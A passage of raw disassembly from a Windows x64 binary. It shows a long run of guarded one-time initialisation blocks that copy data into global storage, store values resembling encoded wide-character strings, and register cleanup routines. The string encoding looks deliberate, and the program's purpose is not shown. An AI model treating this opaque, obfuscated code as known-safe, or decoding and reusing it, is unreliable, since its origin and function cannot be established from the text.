   14000789e:	00 
   14000789f:	48 b8 24 00 27 00 30 	movabs $0x35003000270024,%rax
   1400078a6:	00 35 00 
   1400078a9:	48 89 05 d0 c1 2b 00 	mov    %rax,0x2bc1d0(%rip)        # 0x1402c3a80
   1400078b0:	66 c7 05 cf c1 2b 00 	movw   $0xc5,0x2bc1cf(%rip)        # 0x1402c3a88
   1400078b7:	c5 00 
   1400078b9:	48 8d 0d 80 12 00 00 	lea    0x1280(%rip),%rcx        # 0x140008b40
   1400078c0:	e8 ab 9a ff ff       	call   0x140001370
   1400078c5:	c6 05 be b9 2b 00 01 	movb   $0x1,0x2bb9be(%rip)        # 0x1402c328a
   1400078cc:	80 3d b7 c1 2b 00 00 	cmpb   $0x0,0x2bc1b7(%rip)        # 0x1402c3a8a
   1400078d3:	0f 85 be dd ff ff    	jne    0x140005697
   1400078d9:	e9 13 de ff ff       	jmp    0x1400056f1
   1400078de:	c6 05 1d c2 2b 00 01 	movb   $0x1,0x2bc21d(%rip)        # 0x1402c3b02
   1400078e5:	0f 10 05 d0 47 00 00 	movups 0x47d0(%rip),%xmm0        # 0x14000c0bc
   1400078ec:	0f 29 05 9d c1 2b 00 	movaps %xmm0,0x2bc19d(%rip)        # 0x1402c3a90
   1400078f3:	0f 10 05 d2 47 00 00 	movups 0x47d2(%rip),%xmm0        # 0x14000c0cc
   1400078fa:	0f 29 05 9f c1 2b 00 	movaps %xmm0,0x2bc19f(%rip)        # 0x1402c3aa0
   140007901:	0f 10 05 d4 47 00 00 	movups 0x47d4(%rip),%xmm0        # 0x14000c0dc
   140007908:	0f 29 05 a1 c1 2b 00 	movaps %xmm0,0x2bc1a1(%rip)        # 0x1402c3ab0
   14000790f:	0f 10 05 d6 47 00 00 	movups 0x47d6(%rip),%xmm0        # 0x14000c0ec
   140007916:	0f 29 05 a3 c1 2b 00 	movaps %xmm0,0x2bc1a3(%rip)        # 0x1402c3ac0
   14000791d:	0f 10 05 d8 47 00 00 	movups 0x47d8(%rip),%xmm0        # 0x14000c0fc
   140007924:	0f 29 05 a5 c1 2b 00 	movaps %xmm0,0x2bc1a5(%rip)        # 0x1402c3ad0
   14000792b:	0f 10 05 da 47 00 00 	movups 0x47da(%rip),%xmm0        # 0x14000c10c
   140007932:	0f 29 05 a7 c1 2b 00 	movaps %xmm0,0x2bc1a7(%rip)        # 0x1402c3ae0
   140007939:	f3 0f 6f 05 db 47 00 	movdqu 0x47db(%rip),%xmm0        # 0x14000c11c
   140007940:	00 
   140007941:	66 0f 7f 05 a7 c1 2b 	movdqa %xmm0,0x2bc1a7(%rip)        # 0x1402c3af0
   140007948:	00 
   140007949:	66 c7 05 ae c1 2b 00 	movw   $0xeb,0x2bc1ae(%rip)        # 0x1402c3b00
   140007950:	eb 00 
   140007952:	48 8d 0d 07 12 00 00 	lea    0x1207(%rip),%rcx        # 0x140008b60
   140007959:	e8 12 9a ff ff       	call   0x140001370
   14000795e:	c6 05 26 b9 2b 00 01 	movb   $0x1,0x2bb926(%rip)        # 0x1402c328b
   140007965:	80 3d 96 c1 2b 00 00 	cmpb   $0x0,0x2bc196(%rip)        # 0x1402c3b02
   14000796c:	0f 85 ac dd ff ff    	jne    0x14000571e
   140007972:	e9 75 de ff ff       	jmp    0x1400057ec
   140007977:	c6 05 a4 c1 2b 00 01 	movb   $0x1,0x2bc1a4(%rip)        # 0x1402c3b22
   14000797e:	66 0f 6f 05 ba 3f 00 	movdqa 0x3fba(%rip),%xmm0        # 0x14000b940
   140007985:	00 
   140007986:	66 0f 7f 05 82 c1 2b 	movdqa %xmm0,0x2bc182(%rip)        # 0x1402c3b10
   14000798d:	00 
   14000798e:	66 c7 05 89 c1 2b 00 	movw   $0xeb,0x2bc189(%rip)        # 0x1402c3b20
   140007995:	eb 00 
   140007997:	48 8d 0d 02 12 00 00 	lea    0x1202(%rip),%rcx        # 0x140008ba0
   14000799e:	e8 cd 99 ff ff       	call   0x140001370
   1400079a3:	c6 05 e2 b8 2b 00 01 	movb   $0x1,0x2bb8e2(%rip)        # 0x1402c328c
   1400079aa:	80 3d 71 c1 2b 00 00 	cmpb   $0x0,0x2bc171(%rip)        # 0x1402c3b22
   1400079b1:	0f 85 4b de ff ff    	jne    0x140005802
   1400079b7:	e9 80 de ff ff       	jmp    0x14000583c
   1400079bc:	c6 05 e1 c1 2b 00 01 	movb   $0x1,0x2bc1e1(%rip)        # 0x1402c3ba4
   1400079c3:	0f 10 05 64 47 00 00 	movups 0x4764(%rip),%xmm0        # 0x14000c12e
   1400079ca:	0f 29 05 5f c1 2b 00 	movaps %xmm0,0x2bc15f(%rip)        # 0x1402c3b30
   1400079d1:	0f 10 05 66 47 00 00 	movups 0x4766(%rip),%xmm0        # 0x14000c13e
   1400079d8:	0f 29 05 61 c1 2b 00 	movaps %xmm0,0x2bc161(%rip)        # 0x1402c3b40
   1400079df:	0f 10 05 68 47 00 00 	movups 0x4768(%rip),%xmm0        # 0x14000c14e
   1400079e6:	0f 29 05 63 c1 2b 00 	movaps %xmm0,0x2bc163(%rip)        # 0x1402c3b50
   1400079ed:	0f 10 05 6a 47 00 00 	movups 0x476a(%rip),%xmm0        # 0x14000c15e
   1400079f4:	0f 29 05 65 c1 2b 00 	movaps %xmm0,0x2bc165(%rip)        # 0x1402c3b60
   1400079fb:	0f 10 05 6c 47 00 00 	movups 0x476c(%rip),%xmm0        # 0x14000c16e
   140007a02:	0f 29 05 67 c1 2b 00 	movaps %xmm0,0x2bc167(%rip)        # 0x1402c3b70
   140007a09:	0f 10 05 6e 47 00 00 	movups 0x476e(%rip),%xmm0        # 0x14000c17e
   140007a10:	0f 29 05 69 c1 2b 00 	movaps %xmm0,0x2bc169(%rip)        # 0x1402c3b80
   140007a17:	f3 0f 6f 05 6f 47 00 	movdqu 0x476f(%rip),%xmm0        # 0x14000c18e
   140007a1e:	00 
   140007a1f:	66 0f 7f 05 69 c1 2b 	movdqa %xmm0,0x2bc169(%rip)        # 0x1402c3b90
   140007a26:	00 
   140007a27:	c7 05 6f c1 2b 00 98 	movl   $0x350098,0x2bc16f(%rip)        # 0x1402c3ba0
   140007a2e:	00 35 00 
   140007a31:	48 8d 0d 88 11 00 00 	lea    0x1188(%rip),%rcx        # 0x140008bc0
   140007a38:	e8 33 99 ff ff       	call   0x140001370
   140007a3d:	c6 05 49 b8 2b 00 01 	movb   $0x1,0x2bb849(%rip)        # 0x1402c328d
   140007a44:	80 3d 59 c1 2b 00 00 	cmpb   $0x0,0x2bc159(%rip)        # 0x1402c3ba4
   140007a4b:	0f 85 18 de ff ff    	jne    0x140005869
   140007a51:	e9 f9 de ff ff       	jmp    0x14000594f
   140007a56:	c6 05 67 c1 2b 00 01 	movb   $0x1,0x2bc167(%rip)        # 0x1402c3bc4
   140007a5d:	66 0f 6f 05 fb 3e 00 	movdqa 0x3efb(%rip),%xmm0        # 0x14000b960
   140007a64:	00 
   140007a65:	66 0f 7f 05 43 c1 2b 	movdqa %xmm0,0x2bc143(%rip)        # 0x1402c3bb0
   140007a6c:	00 
   140007a6d:	c7 05 49 c1 2b 00 a5 	movl   $0x3500a5,0x2bc149(%rip)        # 0x1402c3bc0
   140007a74:	00 35 00 
   140007a77:	48 8d 0d 82 11 00 00 	lea    0x1182(%rip),%rcx        # 0x140008c00
   140007a7e:	e8 ed 98 ff ff       	call   0x140001370
   140007a83:	c6 05 04 b8 2b 00 01 	movb   $0x1,0x2bb804(%rip)        # 0x1402c328e
   140007a8a:	80 3d 33 c1 2b 00 00 	cmpb   $0x0,0x2bc133(%rip)        # 0x1402c3bc4
   140007a91:	0f 85 ce de ff ff    	jne    0x140005965
   140007a97:	e9 10 df ff ff       	jmp    0x1400059ac
   140007a9c:	c6 05 49 c1 2b 00 01 	movb   $0x1,0x2bc149(%rip)        # 0x1402c3bec
   140007aa3:	66 0f 6f 05 d5 3e 00 	movdqa 0x3ed5(%rip),%xmm0        # 0x14000b980
   140007aaa:	00 
   140007aab:	66 0f 7f 05 1d c1 2b 	movdqa %xmm0,0x2bc11d(%rip)        # 0x1402c3bd0
   140007ab2:	00 
   140007ab3:	48 b8 34 00 fb 00 32 	movabs $0x45003200fb0034,%rax
   140007aba:	00 45 00 
   140007abd:	48 89 05 1c c1 2b 00 	mov    %rax,0x2bc11c(%rip)        # 0x1402c3be0
   140007ac4:	c7 05 1a c1 2b 00 32 	movl   $0xcd0032,0x2bc11a(%rip)        # 0x1402c3be8
   140007acb:	00 cd 00 
   140007ace:	48 8d 0d 4b 11 00 00 	lea    0x114b(%rip),%rcx        # 0x140008c20
   140007ad5:	e8 96 98 ff ff       	call   0x140001370
   140007ada:	c6 05 ae b7 2b 00 01 	movb   $0x1,0x2bb7ae(%rip)        # 0x1402c328f
   140007ae1:	80 3d 04 c1 2b 00 00 	cmpb   $0x0,0x2bc104(%rip)        # 0x1402c3bec
   140007ae8:	0f 85 fb de ff ff    	jne    0x1400059e9
   140007aee:	e9 5d df ff ff       	jmp    0x140005a50
   140007af3:	48 8d 0d a8 46 00 00 	lea    0x46a8(%rip),%rcx        # 0x14000c1a2
   140007afa:	e8 41 11 00 00       	call   0x140008c40
   140007aff:	48 8d 0d 9a 12 00 00 	lea    0x129a(%rip),%rcx        # 0x140008da0
   140007b06:	e8 65 98 ff ff       	call   0x140001370
   140007b0b:	c6 05 7e b7 2b 00 01 	movb   $0x1,0x2bb77e(%rip)        # 0x1402c3290
   140007b12:	80 3d 13 c1 2b 00 00 	cmpb   $0x0,0x2bc113(%rip)        # 0x1402c3c2c
   140007b19:	0f 85 70 df ff ff    	jne    0x140005a8f
   140007b1f:	e9 49 e0 ff ff       	jmp    0x140005b6d
   140007b24:	48 8d 0d b3 46 00 00 	lea    0x46b3(%rip),%rcx        # 0x14000c1de
   140007b2b:	e8 90 12 00 00       	call   0x140008dc0
   140007b30:	48 8d 0d e9 13 00 00 	lea    0x13e9(%rip),%rcx        # 0x140008f20
   140007b37:	e8 34 98 ff ff       	call   0x140001370
   140007b3c:	c6 05 4e b7 2b 00 01 	movb   $0x1,0x2bb74e(%rip)        # 0x1402c3291
   140007b43:	80 3d 22 c1 2b 00 00 	cmpb   $0x0,0x2bc122(%rip)        # 0x1402c3c6c
   140007b4a:	0f 85 54 e0 ff ff    	jne    0x140005ba4
   140007b50:	e9 2d e1 ff ff       	jmp    0x140005c82
   140007b55:	48 8d 0d be 46 00 00 	lea    0x46be(%rip),%rcx        # 0x14000c21a
   140007b5c:	e8 df 13 00 00       	call   0x140008f40
   140007b61:	48 8d 0d 18 15 00 00 	lea    0x1518(%rip),%rcx        # 0x140009080
   140007b68:	e8 03 98 ff ff       	call   0x140001370
   140007b6d:	c6 05 1e b7 2b 00 01 	movb   $0x1,0x2bb71e(%rip)        # 0x1402c3292
   140007b74:	80 3d 2d c1 2b 00 00 	cmpb   $0x0,0x2bc12d(%rip)        # 0x1402c3ca8
   140007b7b:	0f 85 38 e1 ff ff    	jne    0x140005cb9
   140007b81:	e9 e6 e1 ff ff       	jmp    0x140005d6c
   140007b86:	48 8d 0d c5 46 00 00 	lea    0x46c5(%rip),%rcx        # 0x14000c252
   140007b8d:	e8 1e 15 00 00       	call   0x1400090b0
   140007b92:	48 8d 0d 57 16 00 00 	lea    0x1657(%rip),%rcx        # 0x1400091f0
   140007b99:	e8 d2 97 ff ff       	call   0x140001370
   140007b9e:	c6 05 ee b6 2b 00 01 	movb   $0x1,0x2bb6ee(%rip)        # 0x1402c3293
   140007ba5:	80 3d 3c c1 2b 00 00 	cmpb   $0x0,0x2bc13c(%rip)        # 0x1402c3ce8
   140007bac:	0f 85 f4 e1 ff ff    	jne    0x140005da6
   140007bb2:	e9 a2 e2 ff ff       	jmp    0x140005e59
   140007bb7:	c6 05 8c b7 2b 00 01 	movb   $0x1,0x2bb78c(%rip)        # 0x1402c334a
   140007bbe:	0f 10 05 9b 3f 00 00 	movups 0x3f9b(%rip),%xmm0        # 0x14000bb60
   140007bc5:	0f 29 05 04 b7 2b 00 	movaps %xmm0,0x2bb704(%rip)        # 0x1402c32d0
   140007bcc:	0f 10 05 9d 3f 00 00 	movups 0x3f9d(%rip),%xmm0        # 0x14000bb70
   140007bd3:	0f 29 05 06 b7 2b 00 	movaps %xmm0,0x2bb706(%rip)        # 0x1402c32e0
   140007bda:	0f 10 05 9f 3f 00 00 	movups 0x3f9f(%rip),%xmm0        # 0x14000bb80
   140007be1:	0f 29 05 08 b7 2b 00 	movaps %xmm0,0x2bb708(%rip)        # 0x1402c32f0
   140007be8:	0f 10 05 a1 3f 00 00 	movups 0x3fa1(%rip),%xmm0        # 0x14000bb90
   140007bef:	0f 29 05 0a b7 2b 00 	movaps %xmm0,0x2bb70a(%rip)        # 0x1402c3300
   140007bf6:	0f 10 05 a3 3f 00 00 	movups 0x3fa3(%rip),%xmm0        # 0x14000bba0
   140007bfd:	0f 29 05 0c b7 2b 00 	movaps %xmm0,0x2bb70c(%rip)        # 0x1402c3310
   140007c04:	0f 10 05 a5 3f 00 00 	movups 0x3fa5(%rip),%xmm0        # 0x14000bbb0
   140007c0b:	0f 29 05 0e b7 2b 00 	movaps %xmm0,0x2bb70e(%rip)        # 0x1402c3320
   140007c12:	0f 10 05 a7 3f 00 00 	movups 0x3fa7(%rip),%xmm0        # 0x14000bbc0
   140007c19:	0f 29 05 10 b7 2b 00 	movaps %xmm0,0x2bb710(%rip)        # 0x1402c3330
   140007c20:	f3 0f 6f 05 a2 3f 00 	movdqu 0x3fa2(%rip),%xmm0        # 0x14000bbca
   140007c27:	00 
   140007c28:	f3 0f 7f 05 0a b7 2b 	movdqu %xmm0,0x2bb70a(%rip)        # 0x1402c333a
   140007c2f:	00 
   140007c30:	48 8d 0d e9 bb ff ff 	lea    -0x4417(%rip),%rcx        # 0x140003820
   140007c37:	e8 34 97 ff ff       	call   0x140001370
   140007c3c:	c6 05 27 b6 2b 00 01 	movb   $0x1,0x2bb627(%rip)        # 0x1402c326a
   140007c43:	80 3d 00 b7 2b 00 00 	cmpb   $0x0,0x2bb700(%rip)        # 0x1402c334a
   140007c4a:	0f 85 47 e3 ff ff    	jne    0x140005f97
   140007c50:	e9 5e e4 ff ff       	jmp    0x1400060b3
   140007c55:	48 8d 0d 2e 46 00 00 	lea    0x462e(%rip),%rcx        # 0x14000c28a
   140007c5c:	e8 bf 15 00 00       	call   0x140009220
   140007c61:	48 8d 0d a8 16 00 00 	lea    0x16a8(%rip),%rcx        # 0x140009310
   140007c68:	e8 03 97 ff ff       	call   0x140001370
   140007c6d:	c6 05 20 b6 2b 00 01 	movb   $0x1,0x2bb620(%rip)        # 0x1402c3294
   140007c74:	80 3d 9f c0 2b 00 00 	cmpb   $0x0,0x2bc09f(%rip)        # 0x1402c3d1a
   140007c7b:	0f 85 e9 e5 ff ff    	jne    0x14000626a
   140007c81:	e9 5c e6 ff ff       	jmp    0x1400062e2
   140007c86:	c6 05 f5 c0 2b 00 01 	movb   $0x1,0x2bc0f5(%rip)        # 0x1402c3d82
   140007c8d:	0f 10 05 20 46 00 00 	movups 0x4620(%rip),%xmm0        # 0x14000c2b4
   140007c94:	0f 29 05 85 c0 2b 00 	movaps %xmm0,0x2bc085(%rip)        # 0x1402c3d20
   140007c9b:	0f 10 05 22 46 00 00 	movups 0x4622(%rip),%xmm0        # 0x14000c2c4
   140007ca2:	0f 29 05 87 c0 2b 00 	movaps %xmm0,0x2bc087(%rip)        # 0x1402c3d30
   140007ca9:	0f 10 05 24 46 00 00 	movups 0x4624(%rip),%xmm0        # 0x14000c2d4
   140007cb0:	0f 29 05 89 c0 2b 00 	movaps %xmm0,0x2bc089(%rip)        # 0x1402c3d40
   140007cb7:	0f 10 05 26 46 00 00 	movups 0x4626(%rip),%xmm0        # 0x14000c2e4
   140007cbe:	0f 29 05 8b c0 2b 00 	movaps %xmm0,0x2bc08b(%rip)        # 0x1402c3d50
   140007cc5:	0f 10 05 28 46 00 00 	movups 0x4628(%rip),%xmm0        # 0x14000c2f4
   140007ccc:	0f 29 05 8d c0 2b 00 	movaps %xmm0,0x2bc08d(%rip)        # 0x1402c3d60
   140007cd3:	f3 0f 6f 05 29 46 00 	movdqu 0x4629(%rip),%xmm0        # 0x14000c304
   140007cda:	00 
   140007cdb:	66 0f 7f 05 8d c0 2b 	movdqa %xmm0,0x2bc08d(%rip)        # 0x1402c3d70
   140007ce2:	00 
   140007ce3:	66 c7 05 94 c0 2b 00 	movw   $0x97,0x2bc094(%rip)        # 0x1402c3d80
   140007cea:	97 00 
   140007cec:	48 8d 0d 3d 16 00 00 	lea    0x163d(%rip),%rcx        # 0x140009330
   140007cf3:	e8 78 96 ff ff       	call   0x140001370
   140007cf8:	c6 05 96 b5 2b 00 01 	movb   $0x1,0x2bb596(%rip)        # 0x1402c3295
   140007cff:	80 3d 7c c0 2b 00 00 	cmpb   $0x0,0x2bc07c(%rip)        # 0x1402c3d82
   140007d06:	0f 85 0d e6 ff ff    	jne    0x140006319
   140007d0c:	e9 be e6 ff ff       	jmp    0x1400063cf
   140007d11:	48 8d 0d 9a 41 00 00 	lea    0x419a(%rip),%rcx        # 0x14000beb2
   140007d18:	e8 d3 08 00 00       	call   0x1400085f0
   140007d1d:	48 8d 0d bc 09 00 00 	lea    0x9bc(%rip),%rcx        # 0x1400086e0
   140007d24:	e8 47 96 ff ff       	call   0x140001370
   140007d29:	c6 05 4f b5 2b 00 01 	movb   $0x1,0x2bb54f(%rip)        # 0x1402c327f
   140007d30:	80 3d 93 ba 2b 00 00 	cmpb   $0x0,0x2bba93(%rip)        # 0x1402c37ca
   140007d37:	0f 85 10 d1 ff ff    	jne    0x140004e4d
   140007d3d:	e9 83 d1 ff ff       	jmp    0x140004ec5
   140007d42:	c6 05 1b b6 2b 00 01 	movb   $0x1,0x2bb61b(%rip)        # 0x1402c3364
   140007d49:	66 0f 6f 05 9f 3c 00 	movdqa 0x3c9f(%rip),%xmm0        # 0x14000b9f0
   140007d50:	00 
   140007d51:	66 0f 7f 05 f7 b5 2b 	movdqa %xmm0,0x2bb5f7(%rip)        # 0x1402c3350
   140007d58:	00 
   140007d59:	c7 05 fd b5 2b 00 c5 	movl   $0x5d00c5,0x2bb5fd(%rip)        # 0x1402c3360
   140007d60:	00 5d 00 
   140007d63:	48 8d 0d f6 ba ff ff 	lea    -0x450a(%rip),%rcx        # 0x140003860
   140007d6a:	e8 01 96 ff ff       	call   0x140001370
   140007d6f:	c6 05 f5 b4 2b 00 01 	movb   $0x1,0x2bb4f5(%rip)        # 0x1402c326b
   140007d76:	80 3d e7 b5 2b 00 00 	cmpb   $0x0,0x2bb5e7(%rip)        # 0x1402c3364
   140007d7d:	0f 85 e9 e3 ff ff    	jne    0x14000616c
   140007d83:	e9 2b e4 ff ff       	jmp    0x1400061b3
   140007d88:	c6 05 c3 c6 2b 00 01 	movb   $0x1,0x2bc6c3(%rip)        # 0x1402c4452
   140007d8f:	48 b8 97 00 7a 00 7a 	movabs $0x97007a007a0097,%rax
   140007d96:	00 97 00 
   140007d99:	48 89 05 a8 c6 2b 00 	mov    %rax,0x2bc6a8(%rip)        # 0x1402c4448
   140007da0:	66 c7 05 a7 c6 2b 00 	movw   $0x3b,0x2bc6a7(%rip)        # 0x1402c4450
   140007da7:	3b 00 
   140007da9:	48 8d 0d f0 ba ff ff 	lea    -0x4510(%rip),%rcx        # 0x1400038a0
   140007db0:	e8 bb 95 ff ff       	call   0x140001370
   140007db5:	c6 05 e5 b4 2b 00 01 	movb   $0x1,0x2bb4e5(%rip)        # 0x1402c32a1
   140007dbc:	80 3d 8f c6 2b 00 00 	cmpb   $0x0,0x2bc68f(%rip)        # 0x1402c4452
   140007dc3:	0f 85 77 e6 ff ff    	jne    0x140006440
   140007dc9:	e9 ae e6 ff ff       	jmp    0x14000647c
   140007dce:	48 8d 0d 41 45 00 00 	lea    0x4541(%rip),%rcx        # 0x14000c316
   140007dd5:	e8 96 15 00 00       	call   0x140009370
   140007dda:	48 8d 0d 5f 16 00 00 	lea    0x165f(%rip),%rcx        # 0x140009440
   140007de1:	e8 8a 95 ff ff       	call   0x140001370
   140007de6:	c6 05 a9 b4 2b 00 01 	movb   $0x1,0x2bb4a9(%rip)        # 0x1402c3296
   140007ded:	80 3d be bf 2b 00 00 	cmpb   $0x0,0x2bbfbe(%rip)        # 0x1402c3db2
   140007df4:	0f 85 8e e8 ff ff    	jne    0x140006688
   140007dfa:	e9 df e8 ff ff       	jmp    0x1400066de
   140007dff:	48 8d 0d 32 45 00 00 	lea    0x4532(%rip),%rcx        # 0x14000c338
   140007e06:	e8 55 16 00 00       	call   0x140009460
   140007e0b:	48 8d 0d 3e 17 00 00 	lea    0x173e(%rip),%rcx        # 0x140009550
   140007e12:	e8 59 95 ff ff       	call   0x140001370
   140007e17:	c6 05 79 b4 2b 00 01 	movb   $0x1,0x2bb479(%rip)        # 0x1402c3297
   140007e1e:	80 3d c3 bf 2b 00 00 	cmpb   $0x0,0x2bbfc3(%rip)        # 0x1402c3de8
   140007e25:	0f 85 e6 e8 ff ff    	jne    0x140006711
   140007e2b:	e9 44 e9 ff ff       	jmp    0x140006774
   140007e30:	48 8d 0d 29 45 00 00 	lea    0x4529(%rip),%rcx        # 0x14000c360
   140007e37:	e8 34 17 00 00       	call   0x140009570
   140007e3c:	48 8d 0d 8d 18 00 00 	lea    0x188d(%rip),%rcx        # 0x1400096d0
   140007e43:	e8 28 95 ff ff       	call   0x140001370
   140007e48:	c6 05 49 b4 2b 00 01 	movb   $0x1,0x2bb449(%rip)        # 0x1402c3298
   140007e4f:	80 3d d6 bf 2b 00 00 	cmpb   $0x0,0x2bbfd6(%rip)        # 0x1402c3e2c
   140007e56:	0f 85 54 e9 ff ff    	jne    0x1400067b0
   140007e5c:	e9 29 ea ff ff       	jmp    0x14000688a
   140007e61:	c6 05 d4 bf 2b 00 01 	movb   $0x1,0x2bbfd4(%rip)        # 0x1402c3e3c
   140007e68:	48 b8 bb 00 ac 00 b4 	movabs $0xb700b400ac00bb,%rax
   140007e6f:	00 b7 00 
   140007e72:	48 89 05 b7 bf 2b 00 	mov    %rax,0x2bbfb7(%rip)        # 0x1402c3e30
   140007e79:	c7 05 b5 bf 2b 00 a4 	movl   $0x6700a4,0x2bbfb5(%rip)        # 0x1402c3e38
   140007e80:	00 67 00 
   140007e83:	48 8d 0d 66 18 00 00 	lea    0x1866(%rip),%rcx        # 0x1400096f0
   140007e8a:	e8 e1 94 ff ff       	call   0x140001370
   140007e8f:	c6 05 03 b4 2b 00 01 	movb   $0x1,0x2bb403(%rip)        # 0x1402c3299
   140007e96:	80 3d 9f bf 2b 00 00 	cmpb   $0x0,0x2bbf9f(%rip)        # 0x1402c3e3c
   140007e9d:	0f 85 36 ea ff ff    	jne    0x1400068d9
   140007ea3:	e9 78 ea ff ff       	jmp    0x140006920
   140007ea8:	48 8d 0d ed 44 00 00 	lea    0x44ed(%rip),%rcx        # 0x14000c39c
   140007eaf:	e8 5c 18 00 00       	call   0x140009710
   140007eb4:	48 8d 0d 25 19 00 00 	lea    0x1925(%rip),%rcx        # 0x1400097e0
   140007ebb:	e8 b0 94 ff ff       	call   0x140001370
   140007ec0:	c6 05 d3 b3 2b 00 01 	movb   $0x1,0x2bb3d3(%rip)        # 0x1402c329a
   140007ec7:	80 3d 96 bf 2b 00 00 	cmpb   $0x0,0x2bbf96(%rip)        # 0x1402c3e64
   140007ece:	0f 85 b0 eb ff ff    	jne    0x140006a84
   140007ed4:	e9 0e ec ff ff       	jmp    0x140006ae7
   140007ed9:	c6 05 a8 bf 2b 00 01 	movb   $0x1,0x2bbfa8(%rip)        # 0x1402c3e88
   140007ee0:	66 0f 6f 05 e8 3b 00 	movdqa 0x3be8(%rip),%xmm0        # 0x14000bad0
   140007ee7:	00 
   140007ee8:	66 0f 7f 05 80 bf 2b 	movdqa %xmm0,0x2bbf80(%rip)        # 0x1402c3e70
   140007eef:	00 
   140007ef0:	48 b8 ae 00 b3 00 9c 	movabs $0x5f009c00b300ae,%rax
   140007ef7:	00 5f 00 
   140007efa:	48 89 05 7f bf 2b 00 	mov    %rax,0x2bbf7f(%rip)        # 0x1402c3e80
   140007f01:	48 8d 0d f8 18 00 00 	lea    0x18f8(%rip),%rcx        # 0x140009800
   140007f08:	e8 63 94 ff ff       	call   0x140001370
   140007f0d:	c6 05 87 b3 2b 00 01 	movb   $0x1,0x2bb387(%rip)        # 0x1402c329b
   140007f14:	80 3d 6d bf 2b 00 00 	cmpb   $0x0,0x2bbf6d(%rip)        # 0x1402c3e88
   140007f1b:	0f 85 8a ec ff ff    	jne    0x140006bab
   140007f21:	e9 cc ec ff ff       	jmp    0x140006bf2
   140007f26:	c6 05 7b bf 2b 00 01 	movb   $0x1,0x2bbf7b(%rip)        # 0x1402c3ea8
   140007f2d:	66 0f 6f 05 cb 3b 00 	movdqa 0x3bcb(%rip),%xmm0        # 0x14000bb00
   140007f34:	00 
   140007f35:	66 0f 7f 05 53 bf 2b 	movdqa %xmm0,0x2bbf53(%rip)        # 0x1402c3e90
   140007f3c:	00 
   140007f3d:	48 b8 e8 00 fb 00 e8 	movabs $0x8300e800fb00e8,%rax
   140007f44:	00 83 00 
   140007f47:	48 89 05 52 bf 2b 00 	mov    %rax,0x2bbf52(%rip)        # 0x1402c3ea0
   140007f4e:	48 8d 0d cb 18 00 00 	lea    0x18cb(%rip),%rcx        # 0x140009820
   140007f55:	e8 16 94 ff ff       	call   0x140001370
   140007f5a:	c6 05 3b b3 2b 00 01 	movb   $0x1,0x2bb33b(%rip)        # 0x1402c329c
   140007f61:	80 3d 40 bf 2b 00 00 	cmpb   $0x0,0x2bbf40(%rip)        # 0x1402c3ea8
   140007f68:	0f 85 0c ed ff ff    	jne    0x140006c7a
   140007f6e:	e9 4e ed ff ff       	jmp    0x140006cc1
   140007f73:	48 8d 0d 46 44 00 00 	lea    0x4446(%rip),%rcx        # 0x14000c3c0
   140007f7a:	e8 c1 18 00 00       	call   0x140009840
   140007f7f:	48 8d 0d 4a 1a 00 00 	lea    0x1a4a(%rip),%rcx        # 0x1400099d0
   140007f86:	e8 e5 93 ff ff       	call   0x140001370
   140007f8b:	c6 05 0b b3 2b 00 01 	movb   $0x1,0x2bb30b(%rip)        # 0x1402c329d
   140007f92:	80 3d 5d bf 2b 00 00 	cmpb   $0x0,0x2bbf5d(%rip)        # 0x1402c3ef6
   140007f99:	0f 85 64 ed ff ff    	jne    0x140006d03
   140007f9f:	e9 10 ee ff ff       	jmp    0x140006db4
   140007fa4:	c6 05 6b bf 2b 00 01 	movb   $0x1,0x2bbf6b(%rip)        # 0x1402c3f16
   140007fab:	66 0f 6f 05 8d 3b 00 	movdqa 0x3b8d(%rip),%xmm0        # 0x14000bb40
   140007fb2:	00 
   140007fb3:	66 0f 7f 05 45 bf 2b 	movdqa %xmm0,0x2bbf45(%rip)        # 0x1402c3f00
   140007fba:	00 
   140007fbb:	c7 05 4b bf 2b 00 c1 	movl   $0xae00c1,0x2bbf4b(%rip)        # 0x1402c3f10
   140007fc2:	00 ae 00 
   140007fc5:	66 c7 05 46 bf 2b 00 	movw   $0x49,0x2bbf46(%rip)        # 0x1402c3f14
   140007fcc:	49 00 
   140007fce:	48 8d 0d 2b 1a 00 00 	lea    0x1a2b(%rip),%rcx        # 0x140009a00
   140007fd5:	e8 96 93 ff ff       	call   0x140001370
   140007fda:	c6 05 bd b2 2b 00 01 	movb   $0x1,0x2bb2bd(%rip)        # 0x1402c329e
   140007fe1:	80 3d 2e bf 2b 00 00 	cmpb   $0x0,0x2bbf2e(%rip)        # 0x1402c3f16
   140007fe8:	0f 85 dc ed ff ff    	jne    0x140006dca
   140007fee:	e9 33 ee ff ff       	jmp    0x140006e26
   140007ff3:	c6 05 1a c4 2b 00 01 	movb   $0x1,0x2bc41a(%rip)        # 0x1402c4414
   140007ffa:	48 8d 0d 17 bf 2b 00 	lea    0x2bbf17(%rip),%rcx        # 0x1402c3f18
   140008001:	48 8d 15 fe 43 00 00 	lea    0x43fe(%rip),%rdx        # 0x14000c406
   140008008:	41 b8 fc 04 00 00    	mov    $0x4fc,%r8d
   14000800e:	e8 2d 1f 00 00       	call   0x140009f40
   140008013:	48 8d 0d 06 1a 00 00 	lea    0x1a06(%rip),%rcx        # 0x140009a20
   14000801a:	e8 51 93 ff ff       	call   0x140001370
   14000801f:	c6 05 79 b2 2b 00 01 	movb   $0x1,0x2bb279(%rip)        # 0x1402c329f
   140008026:	80 3d e7 c3 2b 00 00 	cmpb   $0x0,0x2bc3e7(%rip)        # 0x1402c4414
   14000802d:	0f 85 0d ee ff ff    	jne    0x140006e40
   140008033:	e9 bf ef ff ff       	jmp    0x140006ff7
   140008038:	c6 05 35 b3 2b 00 01 	movb   $0x1,0x2bb335(%rip)        # 0x1402c3374
   14000803f:	48 b8 a6 00 c7 00 b4 	movabs $0xc500b400c700a6,%rax
   140008046:	00 c5 00 
   140008049:	48 89 05 18 b3 2b 00 	mov    %rax,0x2bb318(%rip)        # 0x1402c3368
   140008050:	c7 05 16 b3 2b 00 c7 	movl   $0x5300c7,0x2bb316(%rip)        # 0x1402c3370
   140008057:	00 53 00 
   14000805a:	48 8d 0d 1f b8 ff ff 	lea    -0x47e1(%rip),%rcx        # 0x140003880
   140008061:	e8 0a 93 ff ff       	call   0x140001370
   140008066:	c6 05 ff b1 2b 00 01 	movb   $0x1,0x2bb1ff(%rip)        # 0x1402c326c
   14000806d:	80 3d 00 b3 2b 00 00 	cmpb   $0x0,0x2bb300(%rip)        # 0x1402c3374
   140008074:	0f 85 1d e9 ff ff    	jne    0x140006997
   14000807a:	e9 5f e9 ff ff       	jmp    0x1400069de
   14000807f:	48 8b 8d 38 17 00 00 	mov    0x1738(%rbp),%rcx
